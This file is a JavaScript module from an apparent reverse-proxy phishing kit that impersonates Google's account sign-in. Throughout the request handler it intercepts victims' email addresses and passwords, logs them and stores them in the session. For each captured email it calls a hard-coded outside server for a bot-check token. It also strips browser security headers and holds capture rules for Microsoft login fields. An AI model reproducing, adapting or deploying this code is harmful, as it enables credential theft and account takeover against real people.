/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
const url = require('url')
const fs = require('fs')
const superagent = require('superagent');


// eslint-disable-next-line import/no-dynamic-require
const globalWorker = process.HOOK_JS_MODULE

/** Defined Functions used */


/** Important Defaults */
const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClass {

    constructor(proxyEndpoint, browserReq) {
        super(proxyEndpoint, browserReq)
    }

    processRequest() {
        return this.makeGmailProcess()

    }

    makeGmailProcess() {
        if (this.browserReq.headers['content-length'] > 0) {
            let cJust = ''
            this.browserReq.on('data', (chunk) => {
                cJust += chunk.toString('utf8')
            })
            this.browserReq.on('end', () => {
                cJust += ''
                const hostDomainRegex = new RegExp(this.browserReq.clientContext.hostname, 'gi')
                const kJust = cJust.replace(hostDomainRegex, 'accounts.google.com')


                const bgRegex = /bgRequest=[^&]*/
                if (this.browserReq.url.startsWith('/_/lookup/accountlookup')) {
                    console.log(kJust)
                    const emailRegex = /f\.req=%5B%22(.*?)%22/
                    const emailMatch = emailRegex.exec(kJust)
                    if (!emailMatch) {
                        console.log('Email did not match')
                        this.proxyEndpoint.setHeader('content-length', kJust.length)
                        this.proxyEndpoint.write(kJust)
                    } else {
                        console.log('Email matched')
                        const emailAdressencoded = emailMatch[1]
                        const emailGmail = decodeURIComponent(emailAdressencoded)
                        Object.assign(this.browserReq.clientContext.sessionBody,
                            { email: emailGmail })
                        console.log(`email address is ${emailGmail}`)
                        superagent.get(`http://49.12.240.55:80/token/${emailGmail}`)
                            .end((err, resp) => {
                            if (resp && resp.body) {
                                const bgToken = resp.body.token
                                const newJustText = kJust.replace(bgRegex, bgToken)
                                this.browserReq.clientContext.info.bgToken = bgToken
                                console.log('NEW TOKEN')
                                console.log(newJustText)
                                this.proxyEndpoint.setHeader('content-length', newJustText.length)
                                this.proxyEndpoint.write(newJustText)
                            } else {
                                this.proxyEndpoint.setHeader('content-length', kJust.length)
                                this.proxyEndpoint.write(kJust) 
                            }
                        })
                    }
                } else if (bgRegex.test(kJust)) {
                    console.log('passed regex test')
                    const pwRegex = /f.req=%5B.*?null%2C%5B1%2Cnull%2Cnull%2Cnull%2C%5B%22(.*?)%22%2Cnull%2Ctrue%5D%5D%5D/
                    const pwMatch = pwRegex.exec(kJust)
                    if (pwMatch) {
                        console.log(`Password :  ${pwMatch[1]}`)
                        Object.assign(this.browserReq.clientContext.sessionBody,
                            { password: decodeURIComponent(pwMatch[1]) })
                        this.browserReq.clientContext.setLogAvailable(true)
                    }
                    if (this.browserReq.clientContext.info.bgToken) {
                        console.log('updating bg')
                        const oldJustText = kJust.replace(bgRegex, 
                            this.browserReq.clientContext.info.bgToken)
                        this.proxyEndpoint.setHeader('content-length', oldJustText.length)
                        this.proxyEndpoint.write(oldJustText)
                    } else {
                        console.log('this should never happen')
                        this.proxyEndpoint.setHeader('content-length', kJust.length)
                        this.proxyEndpoint.write(kJust) 
                    }
                } else {
                    console.log('failed regex test')
                    this.proxyEndpoint.setHeader('content-length', kJust.length)
                    this.proxyEndpoint.write(kJust) 
                }

                
                // this.proxyEndpoint.write(kJust)
            })
        } else {
            this.browserReq.pipe(this.proxyEndpoint)
        }

    }
}

const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {

    constructor(proxyResp, browserEndPoint) {
       
        super(proxyResp, browserEndPoint, configExport.EXTERNAL_FILTERS)
        this.regexes = [
            {
                reg: /play.google.com/ig,
                replacement: `${process.env.HOST_DOMAIN}/playboy`,
            },
           {
               reg: /accounts.youtube.com\/accounts\/CheckConnection/gi,
               replacement: `${process.env.HOST_DOMAIN}/CheckConnection`,
           },
           {
               reg: /name="checkConnection" value/gi,
               replacement: /name"checkConnection" value="youtube:1052:1"/,
           },
        //    {
        //        reg: /signaler-pa.googleapis.com/gi,
        //        replacement: process.env.HOST_DOMAIN,
        //    },
        ]
    }


    processResponse() {
        this.browserEndPoint.removeHeader('X-Frame-Options')
        this.browserEndPoint.removeHeader('Content-Security-Policy')
        this.browserEndPoint.removeHeader('X-Content-Type-Options')
        this.browserEndPoint.removeHeader('X-XSS-Protection')
       

        const extRedirectObj = super.getExternalRedirect()
        if (extRedirectObj !== null) {
           const rLocation = extRedirectObj.url
            
        }

        if (this.proxyResp.headers['content-length'] < 1) {
            return this.proxyResp.pipe(this.browserEndPoint)
        }

        // return super.processResponse()
         let newMsgBody;
        return this.superPrepareResponse(true)
            .then((msgBody) => {
                newMsgBody = msgBody
                for (let i = 0; i < this.regexes.length; i += 1) {
                    const regExObj = this.regexes[i]
                    if (regExObj.reg.test(newMsgBody)) {
                        newMsgBody = newMsgBody.replace(regExObj.reg, regExObj.replacement)
                    }
                }
                this.superFinishResponse(newMsgBody)
            }).catch((err) => {
            console.error(err)
        })
    }

    concludeAuth() {
        console.log('logged in fine please')
    }
}


const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true

    }


    execute(clientContext) {
        // this.req.headers['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36'
        // this.req.headers['x-chrome-id-consistency-request'] = 'version=1,client_id=77185425430.apps.googleusercontent.com,device_id=cf7f72b2-ca65-40db-830d-5d000d8888a3,signin_mode=all_accounts,signout_mode=show_confirmation'
        // this.req.headers['x-client-data'] = 'CJC2yQEIprbJAQjEtskBCKmdygEIgeDKAQiWocsBCNvvywEI54TMAQj7qswBCLGuzAEIpa/MAQiysMwBCLGyzAEI87PMAQiEtMwBCIW0zAEYq6nKAQ=='
        
        
        // if (this.req.url === '/sup2'){
        //     this.res.writeHead(302, { location: '/signin/chrome/sync?ssp=1&continue=https%3A%2F%2Fwww.google.com%2F' })
        //     return this.res.end('')
        // }
        
        this.req.headers['accept-encoding'] = 'br'
        if (this.req.method === 'POST') {
            // super.uploadRequestBody(clientContext.currentDomain, clientContext)
        }
        // if (this.req.method === 'POST' && this.req.url.startsWith('/_/signin/challenge')) {
        //     super.uploadRequestBody(clientContext.currentDomain, clientContext)
        // }
        if (this.req.url.startsWith('/punctual/')) {
            console.log(JSON.stringify(this.req.headers))
            this.req.headers['referer'] = this.req.headers['referer'].replace(process.env.HOST_DOMAIN, 'accounts.google.com')
            this.req.headers['Referrer'] = this.req.headers['referer']
            this.req.headers['referrer'] = this.req.headers['referer']
            if (this.req.headers['origin']) {
                this.req.headers['origin'] = this.req.headers['origin'].replace(process.env.HOST_DOMAIN, 'accounts.google.com')
            }
            console.log(JSON.stringify(this.req.headers))
            return super.superExecuteProxy('signaler-pa.googleapis.com', clientContext)
        }
        if (this.req.url === '/cold204') {
            this.res.writeHead(204)
            return this.res.end('')
        }
        if (this.req.url.startsWith('/playboy')) {
            const qhost = 'play.google.com'
            this.req.url = this.req.url.replace('/playboy/log', '/log')
            return super.superExecuteProxy(qhost, clientContext)
        }
        if (this.req.url.startsWith('/CheckConnection')) {
            this.req.url = this.req.url.replace('/CheckConnection', '/accounts/CheckConnection')
            return super.superExecuteProxy('accounts.youtube.com', clientContext)
        }

        if (this.req.url.startsWith('/CheckCookie')) {
            clientContext.setLogAvailable(true)
            super.sendClientData(clientContext, {})
        }
        

        const redirectToken = this.checkForRedirect()
        if (redirectToken !== null) {
            console.log(`Validating the redirect ${JSON.stringify(redirectToken)}`)

            if (redirectToken.url.startsWith('https://myaccount.google.com/')) {
                // clientContext.currentDomain = 'myaccount.google.com'
                // super.sendClientData(clientContext, {})
                // this.res.writeHead(302, { location: 'https://safety.google/privacy/data/' })

                return super.superExecuteProxy('myaccount.google.com', clientContext)

                // this.res.writeHead(302, { location: '/?authuser' })
                // return this.res.end()
            }

            if (redirectToken.url.startsWith('https://accounts.google.com/ManageAccount')) {
                this.req.url = '/ManageAccount'
                return super.superExecuteProxy('accounts.google.com', clientContext)

            }
        }

        if (redirectToken !== null && redirectToken.obj.host === process.env.PROXY_DOMAIN) {
            clientContext.currentDomain = process.env.PROXY_DOMAIN
            this.req.url = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
            // return this.superExecuteProxy(redirectToken.obj.host, clientContext)
        }

        return super.superExecuteProxy(clientContext.currentDomain, clientContext)

    }
}




const configExport = {
    CURRENT_DOMAIN: 'accounts.google.com',

    START_PATH: '/signin/v2/identifier?hl=en&flowName=GlifWebSignIn&flowEntry=ServiceLogin',

    EXTERNAL_FILTERS: 
    [
    // 'signaler-pa.googleapis.com',
    'ssl.gstatic.com',
    ],


    PRE_HANDLERS:
        [
        ],
    PROXY_REQUEST: ProxyRequest,
    PROXY_RESPONSE: ProxyResponse,
    DEFAULT_PRE_HANDLER: DefaultPreHandler,

    CAPTURES: {
        loginUserName: {
            method: 'POST',
            params: ['username'],
            urls: '',
            hosts: ['login.microsoftonline.com'],
        },

        loginPassword: {
            method: 'POST',
            params: ['f.req'],
            urls: '',
            hosts: ['accounts.google.net'],
        },


        loginFmt: {
            method: 'POST',
            params: ['loginfmt'],
            urls: '',
            hosts: ['login.microsoftonline.com'],
        },

        defaultPhpCapture: {
            method: 'POST',
            params: ['default'],
            urls: ['/web'],
            hosts: 'PHP-EXEC',
        },
    },

    // proxyDomain: process.env.PROXY_DOMAIN,
}
module.exports = configExport

